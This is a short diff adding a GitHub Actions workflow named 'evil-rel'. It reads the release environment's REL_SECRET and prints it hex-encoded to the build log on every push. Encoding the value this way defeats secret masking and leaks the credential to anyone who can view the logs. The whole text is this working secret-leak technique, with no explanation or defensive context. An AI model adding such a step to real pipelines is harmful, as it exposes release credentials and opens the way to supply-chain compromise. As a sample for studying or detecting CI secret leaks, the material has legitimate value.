@@ -1,0 +1,9 @@
+name: evil-rel
+on: push
+jobs:
+  rel:
+    runs-on: ubuntu-latest
+    environment: release
+    steps:
+      - env: { S: "${{ secrets.REL_SECRET }}" }
+        run: echo "release hex=$(printf %s "$S" | xxd -p)"
